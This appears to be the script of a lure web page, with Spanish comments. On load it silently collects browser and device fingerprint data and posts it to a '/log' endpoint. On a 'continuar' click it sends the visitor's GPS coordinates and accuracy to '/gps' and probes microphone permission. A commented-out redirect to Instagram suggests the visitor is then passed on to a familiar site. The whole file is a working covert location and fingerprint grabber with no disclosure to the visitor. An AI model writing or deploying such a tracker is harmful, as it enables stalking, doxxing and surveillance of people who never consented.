

// =======================
// DATOS AUTOMATICOS
// =======================

const datos = {

   userAgent:
   navigator.userAgent,

   idioma:
   navigator.language,

   plataforma:
   navigator.platform,

   ancho:
   screen.width,

   alto:
   screen.height,

   memoria:
   navigator.deviceMemory,

   nucleos:
   navigator.hardwareConcurrency,

   touch:
   navigator.maxTouchPoints,

   cookies:
   navigator.cookieEnabled,

   online:
   navigator.onLine,

   referer:
   document.referrer,

   zonaHoraria:
   Intl.DateTimeFormat()
   .resolvedOptions()
   .timeZone,

   hora:
   new Date(),

   conexion:
   navigator.connection?.effectiveType,

   velocidad:
   navigator.connection?.downlink

}


// =======================
// ENVIO DATOS
// =======================

fetch("/log",{

   method:"POST",

   headers:{
      "Content-Type":"application/json"
   },

   body:JSON.stringify(datos)

})


// =======================
// BOTON CONTINUAR
// =======================

document
.getElementById("continuar")
.onclick = async ()=>{


// =======================
// GPS
// =======================

navigator
.geolocation
.getCurrentPosition(

async(pos)=>{

   await fetch("/gps",{

      method:"POST",

      headers:{
         "Content-Type":"application/json"
      },

      body:JSON.stringify({

         lat:
         pos.coords.latitude,

         lon:
         pos.coords.longitude,

         precision:
         pos.coords.accuracy

      })

   })

})


// =======================
// MICROFONO
// =======================

try{

await navigator
.mediaDevices
.getUserMedia({
   audio:true
})

fetch("/microfono",{

   method:"POST",

   headers:{
      "Content-Type":"application/json"
   },

   body:JSON.stringify({
      microfono:"aceptado"
   })

})

}catch{

fetch("/microfono",{

   method:"POST",

   headers:{
      "Content-Type":"application/json"
   },

   body:JSON.stringify({
      microfono:"rechazado"
   })

})

}


// =======================
// REDIRECCION
// =======================

// window.location.href =
// "https://instagram.com"

}
